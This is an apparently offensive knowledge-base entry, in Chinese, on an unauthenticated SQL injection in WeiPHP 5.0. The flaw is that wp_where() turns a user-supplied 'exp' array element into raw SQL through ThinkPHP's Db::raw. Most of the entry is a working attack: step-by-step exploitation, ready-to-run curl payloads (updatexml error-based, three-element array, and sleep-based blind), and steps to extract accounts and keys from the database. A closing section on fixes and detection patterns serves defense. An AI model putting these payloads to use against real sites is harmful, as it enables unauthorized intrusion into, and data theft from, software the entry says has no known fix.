---
id: web-generic-sqli-thinkphp-where-exp-array-injection
title: WeiPHP wp_where() 信任用户可控 exp 数组：bind_follow 未授权报错 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp-exp-operator-array-parameter-raw-sql
tags:
- php
- thinkphp
- weiphp
- sql-injection
- error-based
- time-based
- array-parameter
- exp-operator
- db-raw
- unauthenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: WeiPHP 5.0（ThinkPHP 5.1.37 内核；原文未给出修复版本）
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:11+08:00'
  notes: 已对照原文及 8 张截图核对：bind_follow 未授权、wp_where exp 转 Db::raw、二维/三维 payload、app_debug 关闭后 sleep 盲注均与截图一致。未验证点：未自行复现；原文未给出修复版本。
url: /docs/web/generic/sqli/web-generic-sqli-thinkphp-where-exp-array-injection/
draft: false
kb_aliases:
- WeiPHP 5.0 SQL 注入
- wp_where exp 注入
- ThinkPHP exp 数组注入
- uid[0]=exp uid[1]=payload
- bind_follow SQL 注入
- 未授权报错注入
- Db::raw 用户输入
- ThinkPHP 5.1 数组参数注入
---

## 一句话结论

WeiPHP 5.0 的 `wp_where()` 在把二维数组 `['exp', <值>]` 转成查询条件时，直接把第二个元素交给 `Db::raw()` 当作原始 SQL 表达式，没有任何可信性校验。`bind_follow` 接口又在未登录可访问的白名单中，且把 `I('uid')` 的数组原样传入，于是 `?uid[0]=exp&uid[1]=)...` 即可在无需登录的情况下完成报错注入或时间盲注，读取数据库数据。

## 原理

- **参数形态可控**：PHP 会把 `uid[0]=exp&uid[1]=payload` 解析成 `['exp', 'payload']`。ThinkPHP 的 `I('uid')` 支持数组参数，默认过滤器是 `htmlspecialchars(..., ENT_COMPAT)`，只转义 `<>"&`，不转义单引号、括号、SQL 关键字，数组结构也原样保留。
- **危险转换点**：`wp_where($map)` 遍历条件数组；当 `$value` 是数组且 `strtolower($value[0]) == 'exp'`、`$value[1]` 不是对象时，执行 `$value[1] = Db::raw($value[1])`，随后生成 `[$key, 'exp', Db::raw(...)]`。
- **为什么 `Db::raw` 等于注入**：`Db::raw()` 是 ThinkPHP 的原始表达式机制，本意是插入开发者已知安全的 SQL 片段（如 `NOW()`）。它不做参数绑定、不转义；一旦值来自 `$_GET`，就变成直接拼接。
- **SQL 形态**：ThinkPHP 为字段条件自动加括号，生成类似 ``WHERE `publicid` = 1 AND (`uid` <exp值>) LIMIT 1``。payload 以 `)` 开头闭合 `(uid`，再用 `--+`（或 `#`）注释掉后面的 `) LIMIT 1`，从而让任意 SQL 片段落到 `WHERE` 层。
- **为什么不需要登录**：`Home` 控制器的 `initialize()` 用数据库 `wp_config.ACCESS` 判断免登录页面；`Home/Index/*` 在该白名单中，`$guest_login` 为真，`IS_GET && !is_login() && !$guest_login` 因第三项为假而短路，重定向不执行。`bind_follow` 本身是公开的预览回调，不属于认证绕过，但公开接口叠加了注入。
- **报错回显放大器**：`app_debug` 开启时，PDO 异常页会显示 SQL 语句和 `XPATH syntax error` 中的拼接结果，`updatexml`/`extractvalue` 可直接回显；关闭调试后仍可用 `SLEEP()` 时间盲注。

## 触发条件

- 目标为 WeiPHP 5.0（ThinkPHP 5.1.37 内核），且 `Home/Index/*` 在 `wp_config.ACCESS` 免登录白名单中（默认配置即包含）。
- 入口 `home/index/bind_follow` 可达；`publicid` 与 `is_ajax` 不是注入前提，可省略或任意填。
- 攻击者能发送数组参数：`uid[0]=exp&uid[1]=...`（HTTP GET/POST 均可，取决于路由）。
- 报错注入需 `app_debug` 开启；关闭时使用时间盲注，或改用布尔/其他带外方式。
- 任何把用户输入数组直接传给 `wp_where()` 的控制器方法都可能复用同一原语，不限于 `bind_follow`。

## 利用步骤

1. 访问 `/public/index.php/home/index/bind_follow/?uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)--+`。
2. 观察页面：`app_debug` 开启时返回 `XPATH syntax error: '~数据库名~'`，说明 `updatexml` 的报错内容被回显。
3. 替换 `database()` 为 `user()`、`@@version`、`(select group_concat(table_name) from information_schema.tables where table_schema=database())` 等，逐段枚举。
4. 若调试关闭，改用时间盲注：`uid[1] = ) or sleep(5)#`，通过响应耗时判断条件真假。
5. 也可用三维数组变体：`uid[0]=uid&uid[1]=exp&uid[2]=<payload>`，走 `wp_where()` 的 `count($value)==3` 分支。
6. 提取 `wp_user`、`wp_config` 等表中的账号、密钥、配置数据；必要时进一步读取文件或写入（取决于数据库权限）。

## PoC

```bash
# 报错注入：取当前数据库名
curl -s 'http://target/public/index.php/home/index/bind_follow/?uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)--+'

# 带 publicid / is_ajax 的等价形式（参数对注入无影响）
curl -s 'http://target/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)--+'

# 三维数组变体
curl -s 'http://target/public/index.php/home/index/bind_follow/?uid[0]=uid&uid[1]=exp&uid[2]=)%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)--+'

# 调试关闭时的时间盲注
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://target/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20or%20sleep(5)%23'
```

```text
预期：
报错注入 -> 页面出现 SQLSTATE[HY000] / XPATH syntax error: '~<database>~'
时间盲注 -> 基线响应约百毫秒，命中 sleep(5) 的请求约 5 秒
```

## 变体与关联

- 变体（三维数组）：`['uid','exp','payload']` 命中 `wp_where()` 分支 1，同样把 `$value[2]` 包成 `Db::raw`；适用于参数被框架按三元组解析的场景。
- 变体（其他入口）：任何 `$map['x'] = I('x'); M('table')->where(wp_where($map))->...` 的写法都可被 `x[0]=exp&x[1]=payload` 触发；`bind_follow` 只是已确认的一个公开入口。
- 变体（盲注）：`app_debug=false` 时用 `SLEEP()`、`BENCHMARK()` 或布尔条件;报错注入不可用不代表注入不存在。
- 关联：[[web-generic-sqli-error-based-extraction]]（`updatexml`/`extractvalue` 报错提取通用手法）、[[web-generic-sqli-cartesian-product-time-blind]]（时间盲注的判定与放大）。
- 边界：需要 `uid` 以数组形式到达 `wp_where()`；如果业务代码对参数做了 `is_array` 拒绝或强制 `intval`，该原语失效。`publicid`/`is_ajax` 不是前置条件。

## 检测与防御

- 代码修复：`wp_where()` 中禁止用户输入使用 `exp`——遇到 `strtolower($value[0]) == 'exp'` 直接抛异常；三维数组分支同样处理。不要只对字符串做 `addslashes`，`Db::raw` 的语义是“原样 SQL”，必须从信任边界上禁止。
- 业务层：`bind_follow` 的 `uid` 应按整数处理（`intval`/`is_numeric`），数组直接拒绝；统一要求 `I('uid', 0, 'intval')` 或参数绑定。
- 框架层：避免把 `I()`/`input()` 的原始数组传入查询构造器；对 `exp`、`raw`、`whereRaw` 一类 API 建立代码审计白名单，只允许常量或服务端生成值。
- 运行时缓解：生产环境关闭 `app_debug`，避免 SQL 语句与报错内容回显；数据库账号最小权限，禁用 `FILE` 权限；WAF 拦截 `uid[`、`exp`、`updatexml`、`extractvalue`、`sleep(` 等数组注入特征（仅为缓解）。
- 检测：应用日志中出现 `uid[0]=exp`、`uid[1]=`、`updatexml(`、`extractvalue(`、`sleep(`、`benchmark(`；PDO 异常页在公网出现 `SQLSTATE`、`XPATH syntax error`；同一接口短时间大量不同 `uid[]` 参数与异常响应时间。
